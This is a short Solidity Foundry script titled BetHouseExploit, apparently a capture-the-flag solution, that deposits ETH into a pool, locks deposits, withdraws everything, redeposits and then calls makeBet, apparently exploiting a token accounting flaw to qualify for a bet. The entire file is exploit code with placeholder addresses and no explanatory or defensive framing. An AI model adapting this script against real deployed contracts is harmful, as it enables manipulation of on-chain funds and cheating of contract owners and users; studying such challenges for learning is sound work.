// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IPool {
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function lockDeposits() external;
}

interface IBetHouse {
    function makeBet(address bettor_) external;
}

contract BetHouseExploit is Script {

    function run() external {
        address pool = 0xPOOL;
        address betHouse = 0xBETHOUSE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IPool p = IPool(pool);

        // 1. Deposit ETH → get tokens
        p.deposit{value: 0.001 ether}(0);

        // 2. Lock deposits
        p.lockDeposits();

        // 3. Withdraw everything
        p.withdrawAll();

        // 4. Deposit again to regain tokens
        p.deposit{value: 0.001 ether}(0);

        // 5. Make bet
        IBetHouse(betHouse).makeBet(msg.sender);

        vm.stopBroadcast();
    }
}